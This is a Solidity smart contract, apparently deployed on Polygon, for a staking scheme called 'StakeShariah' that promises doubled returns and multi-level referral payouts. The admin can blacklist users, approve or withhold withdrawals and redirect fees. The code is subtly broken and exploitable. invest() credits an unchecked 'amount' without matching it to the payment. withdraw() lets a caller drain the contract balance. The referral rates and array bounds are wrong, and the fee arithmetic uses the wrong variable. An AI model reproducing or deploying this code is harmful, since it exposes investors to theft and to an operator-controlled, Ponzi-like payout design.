/**
 *Submitted for verification at polygonscan.com on 2023-07-04
*/

pragma solidity 0.8.18;

//SPDX-License-Identifier: MIT
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}
contract StakeShariah {
    using SafeMath for uint;
    uint constant public INVEST_MIN_AMOUNT = 0.01 ether;
    uint constant public INVEST_MAX_AMOUNT = 4000000 ether;
    uint public BASE_PERCENT = 50;
    uint[] public REFERRAL_PERCENTS = [7000, 200, 100];
    uint constant public Maintenance_FEE = 300; 
    uint constant public PROJECT_FEE = 200;
    uint constant public DEV_FEE = 100;
	uint constant public NETWORK = 25;
    uint constant public WITHDRAW_FEE = 50;
    uint constant public CAPITAL_WITHDRAW_FEE = 1500;

    uint constant public Deposit_FEE = 50;
    uint constant public PERCENTS_DIVIDER = 1000;
    uint constant public TIME_STEP = 30 minutes;
    uint public totalInvested;
    address payable public projectAddress;
    address payable public adminAddress;
	address payable public maintenanceAddress;
    address payable  public  developerAddress;
    uint public totalDeposits;
    uint public totalWithdrawn;
    uint public contractPercent;
    uint public contractCreationTime;
    uint public totalRefBonus;
    
    struct Deposit {
        uint64 amount;
        uint64 withdrawn;
        // uint64 refback;
        uint32 start;
    }
    struct User {
        Deposit[] deposits;
        uint32 checkpoint;
        address payable referrer;
        uint64 bonus;
        uint24[11] refs;
        // uint16 rbackPercent;
    }
    mapping (address => User) internal users;
    mapping (uint => uint) internal turnover;
    mapping(address => bool) public isBlacklisted;
    address[] public blacklistedAddresses;

   struct WithdrawalRequest {
        address requester;
        uint amount;
        bool approved;
        bytes32 txHash;
    }

    mapping(address => WithdrawalRequest) public withdrawalRequests;

    event WithdrawalRequested(address requester, uint amount,bool approved ,bytes32 indexed txHash);
    event WithdrawalApproved(address requester, uint amount,bytes32 indexed txHash);
    event AddressBlacklisted(address indexed addr);
    event AddressUnblacklisted(address indexed addr);
    event BasePercentUpdated(uint newPercent);


  

    event Newbie(address user);
    event NewDeposit(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event RefBack(address indexed referrer, address indexed referral, uint amount);
    event FeePayed(address indexed user, uint totalAmount);
    //upline 
     mapping(address => address) public uplinePartners;

    event UplinePartnerSet(address indexed walletAddress, address indexed uplinePartner);

    constructor(address payable adminAddr, address payable projectAddr,address payable  MaintenanceAddr,address payable  developer) {
        adminAddress = adminAddr;
		projectAddress = projectAddr;
        developerAddress = developer;
        maintenanceAddress= MaintenanceAddr;
        contractCreationTime = block.timestamp;
        contractPercent = getContractBalanceRate();
        BASE_PERCENT = getBasePercent();
    }
     modifier onlyAdmin() {
        require(msg.sender == adminAddress, "Only the admin can perform this action");
        _;
    }
   modifier notBlacklisted(address addr) {
        require(!isBlacklisted[addr], "Address is blacklisted");
        _;
    }
    modifier isnotContract(address addr) {
    require(!isContract(addr), "Contract address not allowed");
    _;
    }
         modifier isvalidDepositAmount {
        require(msg.value >= INVEST_MIN_AMOUNT && msg.value <= INVEST_MAX_AMOUNT, "Bad Deposit");
        _;
        }
    function setBasePercent(uint newPercent) public onlyAdmin {
        require(newPercent > 0 && newPercent <= 100, "Percentage should be between 1 and 100");
        BASE_PERCENT = newPercent;
        emit BasePercentUpdated(newPercent);
    }

    function getBasePercent() public view returns (uint) {
        return BASE_PERCENT;
    }
    function blacklistAddress(address addr) public onlyAdmin {
        require(addr != adminAddress, "Cannot blacklist admin address");
        require(!isBlacklisted[addr], "Address is already blacklisted");
        isBlacklisted[addr] = true;
        blacklistedAddresses.push(addr);
        emit AddressBlacklisted(addr);
    }
    function removeAddressFromBlacklist(address addr) internal {
        for (uint i = 0; i < blacklistedAddresses.length; i++) {
            if (blacklistedAddresses[i] == addr) {
                blacklistedAddresses[i] = blacklistedAddresses[blacklistedAddresses.length - 1];
                blacklistedAddresses.pop();
                break;
            }
        }
    }

    function unblacklistAddress(address addr) public onlyAdmin {
        require(isBlacklisted[addr], "Address is not blacklisted");
        isBlacklisted[addr] = false;
        emit AddressUnblacklisted(addr);
        removeAddressFromBlacklist(addr);

    }
    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getContractBalanceRate() public view returns (uint) {
       return  BASE_PERCENT;
    }
    
    
       
    function requestWithdrawal(uint amount)  public notBlacklisted(msg.sender) onlyActive(msg.sender) {
        require(amount > 0, "Withdrawal amount must be greater than zero");
        require(!withdrawalRequests[msg.sender].approved, "Withdrawal request already approved");
        bytes32 txHash = keccak256(abi.encodePacked(msg.sender, amount, block.timestamp));
        withdrawalRequests[msg.sender] = WithdrawalRequest(msg.sender, amount, false,txHash);
        emit WithdrawalRequested(msg.sender, amount,true,txHash);
    }

     function approveWithdrawal(address requester) public onlyAdmin {
        require(withdrawalRequests[requester].amount > 0, "No withdrawal request found for this address");
        require(!withdrawalRequests[requester].approved, "Withdrawal request already approved");

        withdrawalRequests[requester].approved = true;
        address  recipient = address(uint160(requester));
        //process fee
        uint amount= withdrawalRequests[requester].amount;
        uint Maintenance = calculateFee(amount, Maintenance_FEE);
        uint projectFee = calculateFee(amount, PROJECT_FEE);
        uint devFee = calculateFee(amount, DEV_FEE);

        maintenanceAddress.transfer(Maintenance);
        projectAddress.transfer(projectFee);
        developerAddress.transfer(devFee);
        uint userAmount = amount - Maintenance - projectFee - DEV_FEE;
        capitalWithdraw(userAmount,recipient);
        emit WithdrawalApproved(requester, withdrawalRequests[requester].amount, withdrawalRequests[requester].txHash);
    }
   
    
    function withdraw(uint amount) public notBlacklisted(msg.sender) onlyActive(msg.sender) {
        require(amount > 0, "Minimum amount to withdraw is 0.1 bnb");

        uint contractBalance = address(this).balance;
        require(contractBalance >= amount, "Insufficient balance");
   
        User storage user = users[msg.sender];

        uint userPercentRate = getUserPercentRate(msg.sender);

        uint totalAmount = amount;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn));
                }

                user.deposits[i].withdrawn = uint64(uint(user.deposits[i].withdrawn).add(dividends)); /// changing of storage data
                totalAmount = totalAmount.add(dividends);

            }
        }

        require(totalAmount > 0, "User has no dividends");

        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }
        
        user.checkpoint = uint32(block.timestamp);

        totalWithdrawn = totalWithdrawn.add(totalAmount);
        
        emit Withdrawn(msg.sender, totalAmount);

        if(user.referrer!=address(0)){
            uint256 withdrawBonus = totalAmount.mul(WITHDRAW_FEE).div(PERCENTS_DIVIDER);
            user.referrer.transfer(withdrawBonus);
            totalAmount = totalAmount.sub(withdrawBonus);
        }

        //msg.sender.transfer(totalAmount);
      address payable  sender =payable(msg.sender);
      sender.transfer(totalAmount);
  
    }

    function getUserPercentRate(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        if (isActive(userAddress)) {
            uint timeMultiplier = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP.div(2)).mul(5);
           
             return contractPercent.add(timeMultiplier);
        } else {
            return contractPercent;
        }
    }

    function getUserAvailable(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint userPercentRate = getUserPercentRate(userAddress);

        uint totalDividends;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn));
                }

                totalDividends = totalDividends.add(dividends);

                /// no update of withdrawn because that is view function

            }

        }

        return totalDividends;
    }
    function calculateFee(uint value, uint feePercentage) private pure returns (uint) {
    return value.mul(feePercentage).div(PERCENTS_DIVIDER);
}
    function processFees(uint msgValue) private {
    uint marketingFee = calculateFee(msgValue, Maintenance_FEE);
    uint projectFee = calculateFee(msgValue, PROJECT_FEE);
    uint networkFee = calculateFee(msgValue, NETWORK);

    maintenanceAddress.transfer(marketingFee);
    projectAddress.transfer(projectFee);
    uint amount = msgValue - marketingFee-projectFee- networkFee;
    adminAddress.transfer(amount);

    emit FeePayed(msg.sender, marketingFee.add(projectFee).add(networkFee));
}
    function setReferrer(User storage user, address referrer, address defaultReferrer) private {
    if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
        user.referrer = payable(referrer);
    } else {
        user.referrer = payable(defaultReferrer);
    }
}
function processReferralBonuses(User storage user, address upline, uint msgValue) private {
    if (user.referrer != address(0)) {
        for (uint i = 0; i < 11; i++) {
            if (upline != address(0)) {
                uint amount = msgValue.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);

                if (amount > 0) {
                    address payable pay = payable(upline);
                    pay.transfer(amount);
                    users[upline].bonus = uint64(uint(users[upline].bonus).add(amount));

                    // Update the user's bonus amount
                    user.bonus = uint64(uint(user.bonus).add(amount));

                    totalRefBonus = totalRefBonus.add(amount);
                    emit RefBonus(upline, msg.sender, i, amount);
                    emit RefBonus(msg.sender, upline, i, amount); // Emit event for the referral as well
                }

                users[upline].refs[i]++;
                upline = users[upline].referrer;
            } else {
                break;
            }
        }
    }
}


function updateUserInfo(User storage user, uint msgValue) private {
    if (user.deposits.length == 0) {
        user.checkpoint = uint32(block.timestamp);
        emit Newbie(msg.sender);
    }

    user.deposits.push(Deposit(uint64(msgValue), 0, uint32(block.timestamp)));

    totalInvested = totalInvested.add(msgValue);
    totalDeposits++;

    if (contractPercent < BASE_PERCENT) {
        uint contractPercentNew = getContractBalanceRate();
        if (contractPercentNew > contractPercent) {
            contractPercent = contractPercentNew;
        }
    }
}
  function invest(uint256 amount,address referrer) public payable  notBlacklisted(msg.sender) 
    isnotContract(msg.sender)
     {
    address userRefAddress;
    address upline = getUplinePartner();
    if (upline == address(0)) {
        setUplinePartner(referrer);
    } else {
        userRefAddress = upline;
    }

    User storage user = users[msg.sender];

    uint msgValue = amount;

    processFees(msgValue);

    setReferrer(user, referrer, adminAddress);

    processReferralBonuses(user, upline, msgValue);

    updateUserInfo(user, msgValue);

    emit NewDeposit(msg.sender, msgValue - Deposit_FEE * 100);
}
    
    //
    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];

    return (user.deposits.length > 0) && uint(user.deposits[user.deposits.length-1].withdrawn) < uint(user.deposits[user.deposits.length-1].amount).mul(2);
    }
    modifier onlyActive(address userAddress) {
      require(isActive(userAddress), "User is not active");
        _;
    }


    function getUserAmountOfDeposits(address userAddress) public view returns (uint) {
        return users[userAddress].deposits.length;
    }
    
    function getUserLastDeposit(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        return user.checkpoint;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].amount));
        }

        return amount;
    }

    function getUserTotalWithdrawn(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount = user.bonus;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].withdrawn));
        }

        return amount;
    }

    function getUserDeposits(address userAddress, uint last, uint first) public view returns (uint[] memory, uint[] memory, uint[] memory, uint[] memory) {
        User storage user = users[userAddress];

        uint count = first.sub(last);
        if (count > user.deposits.length) {
            count = user.deposits.length;
        }

        uint[] memory amount = new uint[](count);
        uint[] memory withdrawn = new uint[](count);
        uint[] memory refback = new uint[](count);
        uint[] memory start = new uint[](count);

        uint index = 0;
        for (uint i = first; i > last; i--) {
            amount[index] = uint(user.deposits[i-1].amount);
            withdrawn[index] = uint(user.deposits[i-1].withdrawn);
            // refback[index] = uint(user.deposits[i-1].refback);
            start[index] = uint(user.deposits[i-1].start);
            index++;
        }

        return (amount, withdrawn, refback, start);
    }

    // function getSiteStats() public view returns (uint, uint, uint, uint) {
    //     return (totalInvested, totalDeposits, address(this).balance, contractPercent);
    // }

    function getUserStats(address userAddress) public view returns (uint, uint, uint, uint, uint) {
        uint userPerc = getUserPercentRate(userAddress);
        uint userAvailable = getUserAvailable(userAddress);
        uint userDepsTotal = getUserTotalDeposits(userAddress);
        uint userDeposits = getUserAmountOfDeposits(userAddress);
        uint userWithdrawn = getUserTotalWithdrawn(userAddress);

        return (userPerc, userAvailable, userDepsTotal, userDeposits, userWithdrawn);
    }

    function getUserReferralsStats(address userAddress) public view returns (address, uint64, uint24[11] memory) {
        User storage user = users[userAddress];

        return (user.referrer, user.bonus, user.refs);
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
     function setUplinePartner(address uplinePartner) internal  {
         address walletAddress= msg.sender;
        require(uplinePartner != address(0), "Invalid upline partner address");
        require(walletAddress != uplinePartner, "Cannot set self as upline partner");
        require(uplinePartners[walletAddress] == address(0), "Upline partner already set");

        uplinePartners[walletAddress] = uplinePartner;
        emit UplinePartnerSet(walletAddress, uplinePartner);
    }

    function getUplinePartner() public view returns (address) {
        return uplinePartners[msg.sender];
    }
    ///
    function capitalWithdraw(uint256 amount, address addr) public onlyAdmin {
    uint256 userTotalDeposits = getUserTotalDeposits(addr);
    require(amount <= userTotalDeposits, "Insufficient total deposits");


    uint256 transferAmount = amount - calculateFee(amount,CAPITAL_WITHDRAW_FEE);
    uint256 feesAmount = calculateFee(amount,CAPITAL_WITHDRAW_FEE);
    require(transferAmount <= address(this).balance, "Insufficient contract balance");

    address payable sender = payable(addr);
    sender.transfer(transferAmount);
    address payable  proj = payable (projectAddress);
    proj.transfer(feesAmount);
    emit Withdrawn(addr, transferAmount);
}

    // deposit for admin
    function deposit() public payable onlyAdmin {
        require(msg.value > 0,'amount should not be zero');
        emit NewDeposit(msg.sender, msg.value);
    }
     function changeAdmin(address newOwner) public onlyAdmin {
        require(newOwner != address(0), "Invalid new owner address");
        adminAddress = payable(newOwner);
    }

}